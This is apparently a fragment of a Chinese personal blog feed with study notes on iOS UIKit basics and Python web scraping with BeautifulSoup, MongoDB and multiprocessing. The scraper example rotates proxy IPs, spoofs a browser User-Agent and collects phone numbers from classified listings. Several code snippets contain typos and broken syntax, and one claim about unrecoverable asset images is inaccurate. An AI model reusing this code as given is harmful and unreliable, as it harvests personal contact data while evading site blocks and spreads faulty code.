<p>这个属性，只能用来保存一个数字，对空间的外观没有任何影响</p>
<p>可以通过属性来判断控件的类别：sender.tag，可以在main.storyboard里面定义。</p>
</blockquote>
<h2 id="10-transform属性的使用"><a href="#10-transform属性的使用" class="headerlink" title="10.transform属性的使用"></a>10.transform属性的使用</h2><blockquote>
<p>可以使用动画效果</p>
<p>可以用来修改控件的位置，大小，还有空间的旋转</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">//使图片进行各种移动实例</div><div class="line">#import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line">@property (weak, nonatomic)IBOutlet UIImageView *imageView;//连接需要操控的图片</div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">-(IBAction)moveimage:(UIButton *)sender&#123;</div><div class="line">    CGRect oldframe = self.imageView.frame;</div><div class="line">    switch (sender.tag) &#123;</div><div class="line">        case 1:</div><div class="line">            oldframe.origin.x += 10;</div><div class="line">            break;</div><div class="line">        case 2:</div><div class="line">            oldframe.origin.y +=10;</div><div class="line">            break;</div><div class="line">        case 3:</div><div class="line">            oldframe.origin.x -= 10;</div><div class="line">            break;</div><div class="line">        case 4:</div><div class="line">            oldframe.origin.y -= 10;</div><div class="line">            break;</div><div class="line">        case 5:</div><div class="line">            oldframe.size.height += 10;//使图片进行整体放大，画面感更好</div><div class="line">            oldframe.size.width += 10;</div><div class="line">            oldframe.origin.x -= 5;</div><div class="line">            oldframe.origin.y -= 5;</div><div class="line">            break;</div><div class="line">        case 6:</div><div class="line">            oldframe.size.height -= 10;</div><div class="line">            oldframe.size.width -= 10;</div><div class="line">            oldframe.origin.x += 5;</div><div class="line">            oldframe.origin.y += 5;</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line">    [UIView animateWithDuration:0.3 animations:^&#123;</div><div class="line">        self.imageView.frame = oldframe;</div><div class="line">    &#125;];</div><div class="line">&#125;</div><div class="line">-(IBAction)transformimageView:(UIButton *)sender&#123;</div><div class="line">  self.imageView.transform = CGAffineTransformMakeRotation(M_PI);</div><div class="line">  //M_PI是代表派，M_PI_2代表二分之派，直接创建一个固定的值的transform，如果想要每次都累加，需要使用别的方法。</div><div class="line">  self.imageView.transform = CGAffineTransformRotate(self.imageView.transform, M_PI)</div><div class="line">  //需要传入一个原始的transform，第二个参数是偏移量，通过正负来处理顺时针和逆时针方向。</div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<h2 id="10-获取删除子控件"><a href="#10-获取删除子控件" class="headerlink" title="10.获取删除子控件"></a>10.获取删除子控件</h2><blockquote>
<p>通过自身View的subview来获取子控件的属性，通过removeFromSuperview删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; self.whiteview.subviews其实是一个数组，存放的是每一个子控件的信息，可以通过下标来访问，通过removeFromSuperview来删除，删除之后类似于栈数据结构，移除栈顶元素之后自动前补，如果为空继续删除，会进行报错。</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>或者通过for循环来删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; //可以把子类对象放到父类类型的变量中</div><div class="line">&gt; for (UILabel *label in self.whiteview.subviews)</div><div class="line">&gt;   [label removeFromSuperview];</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>删除指定tag的view</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; [self.whiteview viewWithTag:x]获取下标为x的控件</div><div class="line">&gt; 如果自己的tag和子控件一样，也能够获取到，优先获取父控件，而且如果删除了父控件，那么它所有的子控件都会被删除</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
</blockquote>
<h2 id="11-设置一个图片浏览器的例子"><a href="#11-设置一个图片浏览器的例子" class="headerlink" title="11.设置一个图片浏览器的例子"></a>11.设置一个图片浏览器的例子</h2><blockquote>
<p>label属性的设置：lines属性设置为0可以自动换行，高度不够，自动换行也是看不到的</p>
<p>按钮的启用禁用：按钮有一个属性，enabled 如果是yes，就是可以点击，反之亦然。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line">@property(assign, nonatomic)int index;</div><div class="line">@property (weak, nonatomic) IBOutlet UIImageView *imageview;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *lastbutton;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *nextbutton;</div><div class="line">@property (weak, nonatomic) IBOutlet UILabel *indexLabel;</div><div class="line">@property (weak, nonatomic) IBOutlet UILabel *infoLabel;</div><div class="line"></div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    //当控制器的view和上面的子控件创建完毕之后就会执行这个方法</div><div class="line">    [super viewDidLoad];</div><div class="line">    self.index = 1;</div><div class="line">    self.lastbutton.enabled = NO;</div><div class="line">    [self changeImage];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (IBAction)LastButton:(UIButton *)sender &#123;</div><div class="line">    self.index--;</div><div class="line">    [self changeImage];</div><div class="line">    if (self.index==1)</div><div class="line">        sender.enabled = NO;</div><div class="line">    if (self.index!=1)</div><div class="line">        self.nextbutton.enabled = YES;</div><div class="line">&#125;</div><div class="line">- (IBAction)NextButton:(UIButton *)sender &#123;</div><div class="line">    self.index++;</div><div class="line">    [self changeImage];</div><div class="line">    if (self.index==3)</div><div class="line">        sender.enabled = NO;</div><div class="line">    if (self.index!=3)</div><div class="line">        self.lastbutton.enabled = YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)changeImage&#123;</div><div class="line">    switch (self.index) &#123;</div><div class="line">        case 1:</div><div class="line">            self.indexLabel.text = @&quot;唔哈哈哈哈&quot;;</div><div class="line">            self.infoLabel.text = @&quot;1/3&quot;;</div><div class="line">            self.imageview.image = [UIImage imageNamed:@&quot;1.jpeg&quot;];</div><div class="line">            break;</div><div class="line">        case 2:</div><div class="line">            self.indexLabel.text = @&quot;小朋友们，还记得我吗？&quot;;</div><div class="line">            self.infoLabel.text = @&quot;2/3&quot;;</div><div class="line">            self.imageview.image = [UIImage imageNamed:@&quot;2.jpg&quot;];</div><div class="line">            break;</div><div class="line">        case 3:</div><div class="line">            self.indexLabel.text = @&quot;站住不许走&quot;;</div><div class="line">            self.infoLabel.text = @&quot;3/3&quot;;</div><div class="line">            self.imageview.image = [UIImage imageNamed:@&quot;3.jpg&quot;];</div><div class="line">            break;</div><div class="line">            &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<h2 id="12-storyboard控制器"><a href="#12-storyboard控制器" class="headerlink" title="12.storyboard控制器"></a>12.storyboard控制器</h2><blockquote>
<p>main.storyboard里面可以加载多个ViewController,但是程序启动的时候，默认加载的是箭头指向的那个。</p>
<p>可以拖拉箭头或者修改is initial ViewController属性来设置</p>
<p>在storyboard中的控制器，如果想要跟代码建立联系，需要设置CustomClass</p>
<p>storyboard删除之后可以手动创建</p>
<p>如果添加了多个storyboard，默认会找到项目设置中设置的那个</p>
<p>storyboard的实质是一个文本文件，有一定的格式的文件，格式为xml,每一个通过托拉拽的方式添加的控件信息，全部以标签的形式保存在文本中</p>
</blockquote>
<h2 id="13-程序启动的实质"><a href="#13-程序启动的实质" class="headerlink" title="13.程序启动的实质"></a>13.程序启动的实质</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/CD2ECE37-7AD0-46A2-A03C-B4AF645ADDF9.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="14-Bundle和图片放置位置的区别"><a href="#14-Bundle和图片放置位置的区别" class="headerlink" title="14.Bundle和图片放置位置的区别"></a>14.Bundle和图片放置位置的区别</h2><blockquote>
<p>应用程序.app就是bundle</p>
<p>iOS程序打包好之后其实也是xxx.app</p>
<p>通过NSLog(NSHomeDirectory())打印的路径向前移动两个文件夹,bundle中找到相应的app</p>
<p>图片直接放在项目中，在bundle中可以直接看到，放在Assets.xcassets中，打包以后，会加密到Assets.car中，目前为止无法还原出来，更加安全。</p>
<p>NSBundle这个类对应到了当前项目打包以后的xxx.app，使用mainBundle方法可以获取当前应用程序的xx.app。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; NSBundle *mainBundle = [NSBundle mainBundle];</div><div class="line">&gt; NSString *path = [mainBundle pathForResource:@&quot;名字&quot; ofType:@&quot;类型&quot;];</div><div class="line">&gt; NSString *path = [mainBundle pathForResource:@&quot;名字.类型&quot; ofType:@&quot;nil&quot;];//两种方法都可以，可以直接把后缀名加到名字的后面</div><div class="line">&gt; NSLog(path);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>bundle中的所有问价全路径都可以通过pathForResource方法来获取</p>
</blockquote>
<h2 id="15-Plist配合bundle初始化数组和字典"><a href="#15-Plist配合bundle初始化数组和字典" class="headerlink" title="15.Plist配合bundle初始化数组和字典"></a>15.Plist配合bundle初始化数组和字典</h2><blockquote>
<p>可以用来保存字典</p>
<p>项目中的plist文件，保存的位置是bundle中</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//首先创建一个plist，在其中添加你需要的键值对，然后通过路径获取plist</div><div class="line">NSBundle *mainBundle = [NSBundle mainBundle];</div><div class="line">NSString *path = [mainBundle pathForResource:@&quot;xxx.plist&quot; ofType:@&quot;nil&quot;];</div><div class="line">//此时通过路径来初始化字典，初始化数组也是同样的方式，也可以在数组里面嵌套字典。</div><div class="line">NSDictionary *dict = [NSDictionary dictionaryWithContentOfFile:path];</div></pre></td></tr></table></figure>
<h2 id="16-使用UIView播放动画"><a href="#16-使用UIView播放动画" class="headerlink" title="16.使用UIView播放动画"></a>16.使用UIView播放动画</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/1CE00FF4-3E56-4EBA-A9A7-EE061640E832.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="17-iOS开发中内存处理的细节"><a href="#17-iOS开发中内存处理的细节" class="headerlink" title="17.iOS开发中内存处理的细节"></a>17.iOS开发中内存处理的细节</h2><blockquote>
<p>开发iOS项目，如果app占用内存过大，iOS会发送一个警告给应用程序</p>
<p>程序员可以在警告中释放内存</p>
<p>如果发送了警告以后，app内存占用没有任何改变，就会闪退</p>
<p>主要的优化方法在于方法调用完之后对于内存的释放，如果是释放动画，需要延时释放 ，可以用到performSelector方法。</p>
</blockquote>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/609AABF7-22A8-47B7-964C-E7FDF28BABB9.png" alt="" title="" class="">
                <p></p>
            </figure>]]></content>
      
        <categories>
            
            <category> UI学习 基础 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网络爬虫(二)]]></title>
      <url>/2017/05/12/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E4%BA%8C/</url>
      <content type="html"><![CDATA[<p>学习笔记<br><a id="more"></a></p>
<h2 id="19-抓取异步加载的数据"><a href="#19-抓取异步加载的数据" class="headerlink" title="19.抓取异步加载的数据"></a>19.抓取异步加载的数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_more_data</span><span class="params">(start, end)</span>:</span></div><div class="line">    <span class="keyword">for</span> one <span class="keyword">in</span> range(start, end):</div><div class="line">        get_data(url+str(one))</div><div class="line">        tome.sleep(<span class="number">1</span>)</div></pre></td></tr></table></figure>
<h2 id="20-使用MongoDB进行排版和插入"><a href="#20-使用MongoDB进行排版和插入" class="headerlink" title="20.使用MongoDB进行排版和插入"></a>20.使用MongoDB进行排版和插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用mongodb进行简单的读取和插入</span></div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line"></div><div class="line">DB = client[<span class="string">'DB'</span>]</div><div class="line"></div><div class="line">sheet_line = DB[<span class="string">'sheet_line'</span>]</div><div class="line"></div><div class="line">path = <span class="string">'/Users/mac/Desktop/1.md'</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(path, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    lines = f.readlines()</div><div class="line">    <span class="keyword">for</span> index,line <span class="keyword">in</span> enumerate(lines):</div><div class="line">        data=&#123;</div><div class="line">                <span class="string">'line'</span>  : line,</div><div class="line">                <span class="string">'index'</span> : index,</div><div class="line">                <span class="string">'words'</span> : len(line.split())</div><div class="line">             &#125;</div><div class="line">        print(data)</div><div class="line">        sheet_line.insert_one(data)</div></pre></td></tr></table></figure>
<p>几种表达式：</p>
<blockquote>
<p>$lt:less than</p>
<p>$gt:greater than</p>
<p>$lte:less than equal</p>
<p>$gte:greater than equal</p>
<p>$ne:not equal</p>
</blockquote>
<p>e.g-&gt;sheet.find{word:{‘$lt’:5}},表示找到sheet中所有字数比五小的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#找出字数小于等于三的行数并输出其内容</span></div><div class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sheet_line.find&#123;word:&#123;<span class="string">'$lte'</span>:<span class="number">3</span>&#125;&#125;:</div><div class="line">    print(item[<span class="string">'line'</span>])</div></pre></td></tr></table></figure>
<h2 id="21-爬取大规模数据的工作流分析"><a href="#21-爬取大规模数据的工作流分析" class="headerlink" title="21.爬取大规模数据的工作流分析"></a>21.爬取大规模数据的工作流分析</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/7B2E42E6-4839-4CCB-81FB-9D4785BDDA12.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>在爬取大规模数据的时候，要分模块的去爬取</p>
<p>1.构造一个爬取所有网页的爬虫，将爬取到的网页存储到数据库中</p>
<p>2.再构造一个爬虫从数据中提取网址，爬取单个页面的信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#可以通过find方法来对不同的网页来进行适配,e.g:</span></div><div class="line"><span class="keyword">if</span> soup.find(<span class="string">'td'</span>,<span class="string">'t'</span>):</div><div class="line">	<span class="comment">#进行相关的爬取操作</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="comment">#在对数据库进行插入操作的时候，也可以通过键值对的模式</span></div><div class="line"> sheet_line.insert_one(&#123;<span class="string">'url'</span> : <span class="string">'http://www.xxx.com'</span>&#125;)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#将爬取的单个页面信息插入到数据库中</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_item_info</span><span class="params">(url)</span>:</span></div><div class="line">    web_data = requests.get(url)</div><div class="line">    soup = BeautifulSoup(web_data.text, <span class="string">'lxml'</span>)</div><div class="line">    title = soup.title.text</div><div class="line">    price = soup.select(<span class="string">'span.price.c_f50'</span>)[<span class="number">0</span>].text</div><div class="line">    date = soup.select(<span class="string">'.time'</span>)[<span class="number">0</span>].text</div><div class="line">    <span class="comment">#进一步容错的设置</span></div><div class="line">    area = list(soup.select(<span class="string">'.c_25d a'</span>)[<span class="number">0</span>].stripped_strings) <span class="keyword">if</span> soup.find_all(<span class="string">'span'</span>,<span class="string">'c_25d'</span>) <span class="keyword">else</span> <span class="keyword">None</span></div><div class="line">    item_info.insert_one(&#123;<span class="string">'title'</span>:title, <span class="string">'date'</span>:date, <span class="string">'area'</span>:area&#125;)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#对于404页面的判断，e.g:</span></div><div class="line"><span class="comment">#404页面示例</span></div><div class="line">&lt;script src=<span class="string">"http://www.douyu.com/js/404/jQuery-1.3.2.js"</span> type= <span class="string">"text/javascript"</span>&gt;</div><div class="line">no_longer_exist = <span class="string">'404'</span> <span class="keyword">in</span> soup.find(<span class="string">'script'</span>, type = <span class="string">"text/javascript"</span>).get(<span class="string">'src'</span>).split(<span class="string">'/'</span>)</div><div class="line"><span class="comment">#返回一个布尔型来判断，加上一个判断语句加入爬取页面信息的函数即可判断404</span></div></pre></td></tr></table></figure>
<h2 id="22-进程和线程"><a href="#22-进程和线程" class="headerlink" title="22.进程和线程"></a>22.进程和线程</h2><h3 id="形象的理解方式："><a href="#形象的理解方式：" class="headerlink" title="形象的理解方式："></a>形象的理解方式：</h3><blockquote>
<p>单进程单线程：一个餐馆里一张桌子一个人吃饭</p>
<p>单进程多线程：一个餐馆里一张桌子多个人吃饭</p>
<p>多进程单线程：一个餐馆里多张桌子，每张桌子一个人吃饭</p>
<p>多进程多线程：一个餐馆里多张桌子，每个桌子多个人吃法</p>
</blockquote>
<h2 id="23-多进程爬虫数据抓取"><a href="#23-多进程爬虫数据抓取" class="headerlink" title="23.多进程爬虫数据抓取"></a>23.多进程爬虫数据抓取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#需要用到的库</span></div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="keyword">from</span> channel_extract <span class="keyword">import</span> channel_list</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_links_from</span><span class="params">(channel)</span>:</span></div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">        get_link_from(channel,num)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pool = Pool()</div><div class="line">    pool.map(get_all_links_from,channel_list.split())</div></pre></td></tr></table></figure>
<h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><p>map(function,interable,…):对于可迭代函数’iterable’中的每一个元素应用’function’方法，将结果作为list返回</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">e.g1-&gt;def add100(x):</div><div class="line">    	return x + 100</div><div class="line">    hh = [11,22,33]</div><div class="line">    hhh = map(add100,hh)</div><div class="line">#此时hhh的值为[111,122,133]</div><div class="line">#如果给出了额外的可迭代参数，则对每个可迭代参数中的元素‘并行’的应用‘function’。</div><div class="line">e.g2-&gt;def abc(a,b,c)</div><div class="line">	  	return a*10000 + b*100 + c</div><div class="line">	  list1 = [11,22,33]</div><div class="line">      list2 = [44,55,66]</div><div class="line">      list3 = [77,88,99]</div><div class="line">      hh = map(abc,list1,list2,list3)</div><div class="line">#此时hh的值为[114477,225588,336699],在每个list中，取出了下标相同的元素，执行了abc()。</div><div class="line">#如果'function'给出的是‘None’，自动假定一个‘identity’函数</div><div class="line">&gt;&gt;&gt; list1 = [11,22,33]</div><div class="line">&gt;&gt;&gt; map(None,list1)</div><div class="line">[11, 22, 33]</div><div class="line">&gt;&gt;&gt; list1 = [11,22,33]</div><div class="line">&gt;&gt;&gt; list2 = [44,55,66]</div><div class="line">&gt;&gt;&gt; list3 = [77,88,99]</div><div class="line">&gt;&gt;&gt; map(None,list1,list2,list3)</div><div class="line">[(11, 44, 77), (22, 55, 88), (33, 66, 99)]</div></pre></td></tr></table></figure>
<h2 id="24-爬取大规模数据实例代码"><a href="#24-爬取大规模数据实例代码" class="headerlink" title="24.爬取大规模数据实例代码"></a>24.爬取大规模数据实例代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#page_parsing.py</span></div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line"></div><div class="line">ganji = client[<span class="string">'ganji'</span>]</div><div class="line"></div><div class="line">url_list = ganji[<span class="string">'url_list'</span>]</div><div class="line"></div><div class="line">item_info = ganji[<span class="string">'item_info'</span>]</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'</span>,</div><div class="line">    <span class="string">'Connection'</span> : <span class="string">'keep-alive'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">proxy_list = [</div><div class="line">    <span class="string">'http://121.232.147.178:9000'</span>,</div><div class="line">    <span class="string">'http://122.243.11.57:9000'</span>,</div><div class="line">    <span class="string">'http://121.232.145.163:9000'</span></div><div class="line">]</div><div class="line">proxy_ip = random.choice(proxy_list)</div><div class="line">proxies = &#123;<span class="string">'http'</span> : proxy_ip&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links_from</span><span class="params">(channel,pages,who_sells=<span class="string">'o'</span>)</span>:</span></div><div class="line">    list_view = <span class="string">'&#123;&#125;/&#123;&#125;&#123;&#125;/'</span>.format(channel, str(who_sells), str(pages))</div><div class="line">    wb_data = requests.get(channel, headers=headers)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    <span class="keyword">if</span> soup.find(<span class="string">'ul'</span>, <span class="string">'pageLink'</span>):</div><div class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> soup.select(<span class="string">'td.t &gt; a.t'</span>):</div><div class="line">            item_link = link.get(<span class="string">'href'</span>).split(<span class="string">'?'</span>)[<span class="number">0</span>]</div><div class="line">            <span class="comment">#url_list.insert_one(&#123;'url':item_link&#125;)</span></div><div class="line">            <span class="comment">#print(item_link)</span></div><div class="line">            get_item_info_from(item_link)</div><div class="line">            print(<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#已经到达最后一页</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_item_info_from</span><span class="params">(url, data=None)</span>:</span></div><div class="line">    wb_data = requests.get(url, headers=headers)</div><div class="line">    <span class="keyword">if</span> wb_data.status_code == <span class="number">404</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">            data = &#123;</div><div class="line">                <span class="string">'title'</span>:soup.title.text.strip(),</div><div class="line">                <span class="string">'price'</span>:soup.select(<span class="string">'.f22.fc-orange.f-type'</span>)[<span class="number">0</span>].text.strip(),</div><div class="line">                <span class="string">'pub_data'</span>:soup.select(<span class="string">'.pr-5'</span>)[<span class="number">0</span>].text.strip().split()[<span class="number">0</span>],</div><div class="line">                <span class="string">'area'</span>:list(map(<span class="keyword">lambda</span> x:x.text, soup.select(<span class="string">'ul.det-infor &gt; li &gt; a'</span>))),</div><div class="line">                <span class="string">'phoneNumber'</span>:soup.select(<span class="string">'span.phoneNum-style'</span>)[<span class="number">0</span>].text.strip(),</div><div class="line">                <span class="string">'url'</span>:url</div><div class="line">            &#125;</div><div class="line">            print(data)</div><div class="line">        <span class="comment">#except IndexError:</span></div><div class="line">            <span class="keyword">pass</span></div><div class="line">        <span class="keyword">except</span> AttributeError:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="comment">#get_item_info_from('http://bj.ganji.com/shouji/29096013665341x.htm')</span></div><div class="line"><span class="comment">#get_links_from('http://bj.ganji.com/shouji',2)</span></div></pre></td></tr></table></figure>
